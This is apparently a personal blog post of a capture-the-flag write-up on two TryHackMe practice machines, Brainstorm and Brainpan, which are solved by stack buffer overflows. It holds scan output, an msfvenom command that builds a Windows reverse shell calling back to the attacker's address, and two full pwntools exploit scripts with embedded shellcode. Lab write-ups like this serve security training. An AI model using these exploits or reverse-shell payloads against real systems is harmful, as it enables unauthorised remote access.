---
layout: post
title:  "Tryhackme Day Seven"
date:   2020-07-07 20:05:48 +0100
categories: pwn
---

Here is day six of the 30 days of pwn challenge. Today we will be looking at 2 TryHackMe machines: [Brainpan](https://tryhackme.com/room/brainpan) and [Brainstorm](https://tryhackme.com/room/brainstorm)

## Brainstorm

### NMAP
```
PORT     STATE    SERVICE
21/tcp   open     ftp
3389/tcp open     ms-wbt-server
9999/tcp open abyss
```

### FTP
```
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> binary
200 Type set to I.
ftp> mget *
```
Now we have the useful files for the chatserver, we can run it on a windows machine and try to get an exploit from it.

### Finding offset
```
└──╼ $msf-pattern_offset -l 5000 -q 31704330
[*] Exact match at offset 2012
```
After attaching the process to immunity debugger and sending the 5000 char payload, we see that the program crashes upon trying to return to "31704330"

With this knowledge we can search the hex address in msf-pattern_offset to find the offset we need.

### Identify bad chars
```
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```
After Sending the payload including these bad chars, we can look on immunity debugger to see if there are any characters missing from the dump
In this case there are no bad chars (other than \x00).


## Checking Protections
```
!mona modules
```
Using this command we can find the current protections on the binaries that we will be attacking. In this case neither of the programs have any protections on them.
### Finding JUMP ESP gadget
```
!mona find -s '\xff\xe4' -m essfunc.dll
```
This command will show us all of the jump esp gadgets we can use on the machine to return to our shellcode.

### Generate Shell code
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.14 LPORT=4444 -b "\x00" -f python
```
### Exploit Code
```
from pwn import *

r = remote("10.10.10.12",9999)
username = "c0rn"
offset = "A" * 2012
JMP_ESP = p32(0x625014DF)
nop_slide = "\x90" * 100

buf =  b""
buf += b"\xbb\x53\x2f\x16\xb0\xd9\xee\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x5e\x12\x03\x5e\x12\x83\xbd\xd3\xf4"
buf += b"\x45\xbd\xc4\x7b\xa5\x3d\x15\x1c\x2f\xd8\x24\x1c\x4b"
buf += b"\xa9\x17\xac\x1f\xff\x9b\x47\x4d\xeb\x28\x25\x5a\x1c"
buf += b"\x98\x80\xbc\x13\x19\xb8\xfd\x32\x99\xc3\xd1\x94\xa0"
buf += b"\x0b\x24\xd5\xe5\x76\xc5\x87\xbe\xfd\x78\x37\xca\x48"
buf += b"\x41\xbc\x80\x5d\xc1\x21\x50\x5f\xe0\xf4\xea\x06\x22"
buf += b"\xf7\x3f\x33\x6b\xef\x5c\x7e\x25\x84\x97\xf4\xb4\x4c"
buf += b"\xe6\xf5\x1b\xb1\xc6\x07\x65\xf6\xe1\xf7\x10\x0e\x12"
buf += b"\x85\x22\xd5\x68\x51\xa6\xcd\xcb\x12\x10\x29\xed\xf7"
buf += b"\xc7\xba\xe1\xbc\x8c\xe4\xe5\x43\x40\x9f\x12\xcf\x67"
buf += b"\x4f\x93\x8b\x43\x4b\xff\x48\xed\xca\xa5\x3f\x12\x0c"
buf += b"\x06\x9f\xb6\x47\xab\xf4\xca\x0a\xa4\x39\xe7\xb4\x34"
buf += b"\x56\x70\xc7\x06\xf9\x2a\x4f\x2b\x72\xf5\x88\x4c\xa9"
buf += b"\x41\x06\xb3\x52\xb2\x0f\x70\x06\xe2\x27\x51\x27\x69"
buf += b"\xb7\x5e\xf2\x3e\xe7\xf0\xad\xfe\x57\xb1\x1d\x97\xbd"
buf += b"\x3e\x41\x87\xbe\x94\xea\x22\x45\x7f\x1f\xb9\x4f\x71"
buf += b"\x77\xbf\x4f\x9c\xdb\x36\xa9\xf4\xf3\x1e\x62\x61\x6d"
buf += b"\x3b\xf8\x10\x72\x91\x85\x13\xf8\x16\x7a\xdd\x09\x52"
buf += b"\x68\x8a\xf9\x29\xd2\x1d\x05\x84\x7a\xc1\x94\x43\x7a"
buf += b"\x8c\x84\xdb\x2d\xd9\x7b\x12\xbb\xf7\x22\x8c\xd9\x05"
buf += b"\xb2\xf7\x59\xd2\x07\xf9\x60\x97\x3c\xdd\x72\x61\xbc"
buf += b"\x59\x26\x3d\xeb\x37\x90\xfb\x45\xf6\x4a\x52\x39\x50"
buf += b"\x1a\x23\x71\x63\x5c\x2c\x5c\x15\x80\x9d\x09\x60\xbf"
buf += b"\x12\xde\x64\xb8\x4e\x7e\x8a\x13\xcb\x8e\xc1\x39\x7a"
buf += b"\x07\x8c\xa8\x3e\x4a\x2f\x07\x7c\x73\xac\xad\xfd\x80"
buf += b"\xac\xc4\xf8\xcd\x6a\x35\x71\x5d\x1f\x39\x26\x5e\x0a"

payload = offset + JMP_ESP + nop_slide + buf

r.recv(1024)
r.sendline(username)
r.recv(1024)
r.sendline(payload)
r.close()
```

## Brainpan

### NMAP
```
PORT      STATE    SERVICE
5718/tcp  filtered dpm
9999/tcp  open     abyss
10000/tcp open     snet-sensor-mgm
```

### Finding the binary
```
gobuster dir -u http://10.10.58.196:10000/ -w /opt/SecLists/Discovery/Web-Content/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.58.196:10000/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/07 08:05:11 Starting gobuster
===============================================================
/bin (Status: 301)
```
### Exploiting the binary
Since this machine is literally exactly the same process as the previous machine, I will not copy and paste the commands over as it will add nothing.

### Exploit Code
```
from pwn import *

r = remote("10.10.10.12",9999)
offset = "A" * 524
JUMP_ESP = p32(0x311712F3)
nop_slide = "\x90" * 100
buf =  b""
buf += b"\xdb\xd3\xbd\x30\x3e\x7a\xa3\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x52\x31\x68\x17\x83\xc0\x04\x03\x58\x2d\x98"
buf += b"\x56\x64\xb9\xde\x99\x94\x3a\xbf\x10\x71\x0b\xff\x47"
buf += b"\xf2\x3c\xcf\x0c\x56\xb1\xa4\x41\x42\x42\xc8\x4d\x65"
buf += b"\xe3\x67\xa8\x48\xf4\xd4\x88\xcb\x76\x27\xdd\x2b\x46"
buf += b"\xe8\x10\x2a\x8f\x15\xd8\x7e\x58\x51\x4f\x6e\xed\x2f"
buf += b"\x4c\x05\xbd\xbe\xd4\xfa\x76\xc0\xf5\xad\x0d\x9b\xd5"
buf += b"\x4c\xc1\x97\x5f\x56\x06\x9d\x16\xed\xfc\x69\xa9\x27"
buf += b"\xcd\x92\x06\x06\xe1\x60\x56\x4f\xc6\x9a\x2d\xb9\x34"
buf += b"\x26\x36\x7e\x46\xfc\xb3\x64\xe0\x77\x63\x40\x10\x5b"
buf += b"\xf2\x03\x1e\x10\x70\x4b\x03\xa7\x55\xe0\x3f\x2c\x58"
buf += b"\x26\xb6\x76\x7f\xe2\x92\x2d\x1e\xb3\x7e\x83\x1f\xa3"
buf += b"\x20\x7c\xba\xa8\xcd\x69\xb7\xf3\x99\x5e\xfa\x0b\x5a"
buf += b"\xc9\x8d\x78\x68\x56\x26\x16\xc0\x1f\xe0\xe1\x27\x0a"
buf += b"\x54\x7d\xd6\xb5\xa5\x54\x1d\xe1\xf5\xce\xb4\x8a\x9d"
buf += b"\x0e\x38\x5f\x31\x5e\x96\x30\xf2\x0e\x56\xe1\x9a\x44"
buf += b"\x59\xde\xbb\x67\xb3\x77\x51\x92\x54\x72\xac\x96\xaa"
buf += b"\xea\xb2\xa6\xa3\xb6\x3b\x40\xa9\x56\x6a\xdb\x46\xce"
buf += b"\x37\x97\xf7\x0f\xe2\xd2\x38\x9b\x01\x23\xf6\x6c\x6f"
buf += b"\x37\x6f\x9d\x3a\x65\x26\xa2\x90\x01\xa4\x31\x7f\xd1"
buf += b"\xa3\x29\x28\x86\xe4\x9c\x21\x42\x19\x86\x9b\x70\xe0"
buf += b"\x5e\xe3\x30\x3f\xa3\xea\xb9\xb2\x9f\xc8\xa9\x0a\x1f"
buf += b"\x55\x9d\xc2\x76\x03\x4b\xa5\x20\xe5\x25\x7f\x9e\xaf"
buf += b"\xa1\x06\xec\x6f\xb7\x06\x39\x06\x57\xb6\x94\x5f\x68"
buf += b"\x77\x71\x68\x11\x65\xe1\x97\xc8\x2d\x11\xd2\x50\x07"
buf += b"\xba\xbb\x01\x15\xa7\x3b\xfc\x5a\xde\xbf\xf4\x22\x25"
buf += b"\xdf\x7d\x26\x61\x67\x6e\x5a\xfa\x02\x90\xc9\xfb\x06"
payload = offset + JUMP_ESP + nop_slide + buf

print r.recv(1024)
r.sendline(payload)
r.close()
```

I won't detail the priv esc for brainpan since it's supposed to be 30 days of pwn, but it's simply checking sudo priveleges and spawning a shell from it.

## Conclusion

This was a nice break from the other pwn stuff I have been doing. It's an extremely simple process to go through and I will be extremely happy if this is similar to the OSCP buffer overflow machine! I would imagine they have an extra hoop to go through when doing it though.